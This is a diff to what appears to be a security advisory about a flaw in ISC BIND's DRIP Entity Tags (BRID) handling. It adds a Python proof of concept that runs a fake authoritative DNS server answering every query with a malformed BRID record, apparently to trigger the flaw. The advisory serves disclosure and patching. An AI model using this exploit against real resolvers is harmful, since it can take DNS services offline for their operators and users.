@@ -71,6 +71,34 @@ The flaw is part of the IETF DRIP Entity Tags implementation in ISC BIND.
 
 ---
 
+## Proof of Concept
+
+```python
+import socket, struct
+LISTEN = ('127.0.0.1', 53)
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.bind(LISTEN)
+print('Authoritative BRID server listening on', LISTEN, flush=True)
+while True:
+   data, addr = sock.recvfrom(512)
+   if len(data) < 12:
+       continue
+   qid = data[:2]
+   flags = b"\x81\x80"  # qr, rd, ra
+   qdcount = struct.pack('!H', 1)
+   # extract question section
+   idx = 12
+   while idx < len(data) and data[idx] != 0:
+       idx += 1 + data[idx]
+   idx += 1  # end of name
+   idx += 4  # type/class
+   question = data[12:idx]
+   answer = b"\xc0\x0c" + struct.pack('!HHI', 68, 1, 60) + struct.pack('!H', 2) + b"\x00\x00"
+   header = qid + flags + qdcount + struct.pack('!H', 1) + b"\x00\x00\x00\x00"
+   sock.sendto(header + question + answer, addr)
+```
+
+---
 ## Recommendations
 
 If you are running affected versions of ISC BIND, upgrade to the following fixed versions:
